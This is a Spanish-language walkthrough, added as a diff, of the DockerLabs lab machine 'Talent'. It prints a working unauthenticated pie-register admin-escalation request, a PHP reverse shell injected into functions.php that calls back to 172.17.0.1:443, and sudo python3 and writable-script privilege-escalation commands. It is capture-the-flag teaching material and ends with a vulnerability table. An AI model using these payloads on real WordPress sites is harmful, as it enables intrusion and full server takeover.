@@ -1,0 +1,235 @@
+---
+title: Talent
+description: Resolución completa de la máquina virtual *Talent* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Talent**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone una instancia de WordPress con el plugin `pie-register`, vulnerable a **escalada de privilegios sin autenticación**, permitiendo obtener acceso como administrador del sitio. Desde el panel de WordPress, se edita el archivo `functions.php` del tema activo para inyectar una reverse shell y obtener acceso como `www-data`.
+Una vez dentro, se identifica que `www-data` puede ejecutar `python3` como `bobby` mediante `sudo`. Finalmente, se descubre que el directorio `/opt` tiene permisos de escritura para otros usuarios, permitiendo modificar el script `/opt/backup.py` (ejecutable como root con sudo) para obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Talent',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Media',
+    Fecha: '28/02/2026',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Talent.zip
+sudo bash auto_deploy.sh Talent.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Talent/{content,exploits,nmap,scripts}
+cd Talent
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1776374310/Ports_rfh5bp.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+Se identifica una instancia de WordPress. Se realiza enumeración con `wpscan`:
+
+```bash
+wpscan --url http://172.17.0.2 --enumerate u,vp
+```
+
+- Usuario: `admin`
+  ![WP User](https://res.cloudinary.com/dewqswzke/image/upload/v1776374313/WpUser_dn34ql.png)
+- Plugin: `pie-register`
+  ![Plugin](https://res.cloudinary.com/dewqswzke/image/upload/v1776374310/Plugin_d3i5as.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Vulnerabilidad en pie-register
+
+```bash
+searchsploit wordpress pie-register
+```
+
+![Searchsploit](https://res.cloudinary.com/dewqswzke/image/upload/v1776374312/Searchsploit_ivabhv.png)
+
+Se explota la vulnerabilidad de **Admin Privilege Escalation**:
+
+```bash
+wget -q -S -O - http://172.17.0.2 --post-data 'user_id_social_site=1&social_site=true&piereg_login_after_registration=true&_wp_http_referer=/login/&log=null&pwd=null' > /dev/null
+```
+
+![Cookie](https://res.cloudinary.com/dewqswzke/image/upload/v1776374310/Cookie_cu3wfy.png)
+
+### 2.2 Acceso al panel de WordPress
+
+Se reemplazan las cookies y se accede al panel:
+
+![Admin Dashboard](https://res.cloudinary.com/dewqswzke/image/upload/v1776374310/DashboardAdminWordpress_f6veou.png)
+
+### 2.3 Reverse shell
+
+Se edita `functions.php` del tema activo:
+
+```php
+$s=fsockopen("172.17.0.1",443);proc_open("/bin/bash",[$s,$s,$s],$p);
+```
+
+![Theme Edit](https://res.cloudinary.com/dewqswzke/image/upload/v1776374313/ThemeEdit_blkspr.png)
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede a:
+
+```
+http://172.17.0.2/wp-content/themes/twentytwentyfive/functions.php
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1776374311/ReverseShell_cjoaxf.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → bobby
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1776374312/Sudo-lWWWData_cxzkkv.png)
+
+```bash
+sudo -u bobby python3 -c 'import os; os.system("/bin/bash")'
+```
+
+![Bobby](https://res.cloudinary.com/dewqswzke/image/upload/v1776374309/Bobby_qeu817.png)
+
+### 3.2 De bobby → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l bobby](https://res.cloudinary.com/dewqswzke/image/upload/v1776374312/Sudo-lBobby_ldwzgz.png)
+
+El directorio `/opt` tiene permisos de escritura para otros:
+
+```
+drwxr-xrwx 1 root root 4096 Feb 28 14:34 opt
+```
+
+Se modifica `/opt/backup.py`:
+
+```python
+import os
+os.system('/bin/bash')
+```
+
+```bash
+sudo python3 /opt/backup.py
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1776374311/Root_d6wmiz.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Plugin pie-register vulnerable a escalada de privilegios",
+      severity: "Crítica",
+      impact: "Acceso como administrador de WordPress sin autenticación"
+    },
+    {
+      vulnerability: "Editor de temas habilitado en WordPress",
+      severity: "Alta",
+      impact: "Inyección de reverse shell y RCE"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en python3",
+      severity: "Alta",
+      impact: "Movimiento lateral a bobby"
+    },
+    {
+      vulnerability: "Directorio /opt con permisos de escritura para otros",
+      severity: "Crítica",
+      impact: "Modificación de script ejecutado por root"
+    }
+  ]}
+/>
